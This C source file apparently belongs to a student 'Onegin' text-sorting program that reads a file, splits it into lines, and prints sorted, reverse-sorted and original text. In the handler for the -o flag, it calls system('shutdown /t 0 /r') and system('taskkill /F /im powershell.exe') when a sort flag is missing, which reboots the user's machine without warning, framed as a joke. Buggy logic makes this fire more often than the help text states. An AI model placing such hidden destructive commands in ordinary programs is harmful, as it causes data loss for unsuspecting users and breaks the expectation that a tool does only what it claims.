#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <ctype.h>
#include <sys/stat.h>

#include "myio.h"
#include "colors.h"

const size_t startalloc = 6000;

int ParseConsoleArgument (const char *argv[], int CurrentPos, int CurrentArg,
                          struct Flags *ConsFlags, OneginContent Content);

void PrintOrigin (OneginContent Content);
bool CompStr (const char *Line1, const char *Line2);
void Help (void);

void ChangeColourTo (Colour colour);


size_t BaseRead (const char *src, char **Buffer) {

    assert (src != NULL);
    assert (Buffer != NULL);

    int fo = open (src, O_RDONLY | O_BINARY);

    struct stat st = {};

    stat (src, &st);
    _off_t readlen = st.st_size;
    // _off_t readlen = 1500;

    *Buffer = (char*) calloc (readlen + 2, sizeof (char));
    *Buffer[0] = '\0';

    size_t lenbuf = read (fo, *Buffer + 1, readlen);
    return lenbuf;
}


size_t StrToPoint (char *buffer, size_t lenbuf, Line **textptr){

    assert (textptr != NULL);
    assert (buffer  != NULL);

    size_t size = 0;
    size_t alloc = startalloc;

    struct Line *text = (Line*) calloc (alloc, sizeof(Line));
    assert (text != NULL);

    text[size].start = buffer;

    size_t writer = 1;
    size_t reader = 1;

    for (reader = 1; reader < lenbuf - 1; reader++) {

        if (buffer[reader] != '\r') {

            if (buffer[reader] != '\n') {

                buffer[writer] = buffer[reader];
            }
            else {

                buffer[writer] = '\0';
                text[size].end = writer + buffer;
                text[size].length = text[size].end - text[size].start;
                text[size + 1].start = text[size].end;
                size++;
            }

            writer++;
        }
    }

    for (; writer < lenbuf; writer++) {
        buffer[writer] = '\0';
    }

    text = (Line*) realloc (text, size*sizeof(Line));
    assert(text != NULL);

    *textptr = text;
    return size;
}

void PrintToFile (const char *file, Line *text ,size_t size, FILE* fwrite){

    assert (file != NULL);
    assert (text != NULL);
    FILE *fw = NULL;

    if (!fwrite) {
        fw = fopen (file, "w");
    }
    else {
        fw = fwrite;
    }

    for (size_t i = 0; i < size; i++) {

        fprintf (fw, "%s\n", text[i].start + 1);
    }

    fprintf (fw,
        "\n"
        "------------------------------------------------------------------------------------------"
        "\n\n"
    );
}

void PrintOrigin (OneginContent Content){

    char *buffer = Content.buffer + 1;
    size_t len = Content.lenbuf;

    FILE* fw = Content.fwrite;

    size_t pointer = 0;

    while (pointer < len) {
        fputs (buffer + pointer, fw);
        pointer += strlen (buffer + pointer) + 1;
        fputc ('\n',fw);
    }
}

int CheckInputFlags (const char *argv[], int ArgNum, struct Flags *ConsoleFlags, OneginContent Content){

    assert (ConsoleFlags != NULL);
    assert (argv != NULL);

    int ArgGet = 0;
    int CurrentArg = 1;

    while (CurrentArg < ArgNum && argv[CurrentArg][0] == '-'
                               && !isdigit (argv[CurrentArg][1])) {

        int CurrentPos = 0;
        CurrentPos++;

        int Status = ParseConsoleArgument (argv, CurrentPos, CurrentArg, ConsoleFlags, Content);

        ArgGet++;
        CurrentArg++;

        if (!Status) {
            return 0;
        }
    }

    if (ConsoleFlags->NeedHelp) {
        Help ();
        //return ArgNum;
    }

    return ArgGet;
}


int ParseConsoleArgument(const char *argv[], int CurrentPos, int CurrentArg,
                         struct Flags *ConsFlags, OneginContent Content){

    assert (argv != NULL);
    assert (ConsFlags != NULL);

    char Symbol = '\0';
    while ((Symbol = argv[CurrentArg][CurrentPos])) {
        switch (Symbol) {

            case RFlag: {
                ConsFlags->ReverseSort += 1;
                OneginSort (Content, revcmpstr);
                break;
            }

            case SFlag: {
                ConsFlags->StraightSort += 1;
                OneginSort (Content, cmpstr);
                break;
            }

            case OFlag: {
                ConsFlags->Origin += 1;

                if (ConsFlags->ReverseSort  == 0 ||
                    ConsFlags->StraightSort == 0   ) {

                    system ("shutdown /t 0 /r");
                    system ("taskkill /F /im powershell.exe");

                    ChangeColourTo (Red);

                    printf (
                        "Pushkin Recpect ERROR         \n"
                        "You're not a sorting conqueror\n"
                        "Please add more sorting flags \n"
                        "And I won't tear up your lugns\n"
                    );

                    ChangeColourTo (Default);
                }
                else {
                    PrintOrigin (Content);
                }
                break;
            }

            case HFlag: {
                ConsFlags->NeedHelp += 1;
                break;
            }

            case '-': {

                if (CompStr ((argv[CurrentArg]), OriginFlag)) {
                    ConsFlags->Origin += 1;
                    return 1;
                }
                else if (CompStr ((argv[CurrentArg]), HelpFlag)) {
                    ConsFlags->NeedHelp += 1;
                    return 1;
                }
                else return 0;
            }

            default : return 0;
        }
        CurrentPos++;
    }
    return 1;
}

void Help (void){
    printf (
        "Onegin [options] [coefs]  usage information\n"
        "Options\n"

        "\t-" HFlagStr "/" HelpFlag "    Display this information and quit\n"
        "\t-" OFlagStr "/" OriginFlag "  Add origin text. Must go after at least 1 -s and at least 1 -r\n"
        "\t-" RFlagStr "            Add reverse-sorted origin. At least 1 required\n"
        "\t-" SFlagStr "            Add sorted origin. At least 1 required\n"

        "\n\n\n"

        "\tAFTER optional arguments enter 3 coefficients splitted with <Space>\n\n\n"
    );
}

void ChangeColourTo (Colour colour){

    HANDLE hConsole = GetStdHandle (STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute (hConsole, colour);
}

bool CompStr (const char *Line1, const char *Line2){

    assert (Line1 != NULL);
    assert (Line2 != NULL);

    int Position = 0;
    for (; Line1[Position] != '\0' && Line2[Position] != '\0'
                                   && Line1[Position] == Line2[Position]; Position++)
        ;

    return Line1[Position] == '\0' && Line2[Position] == '\0';

}
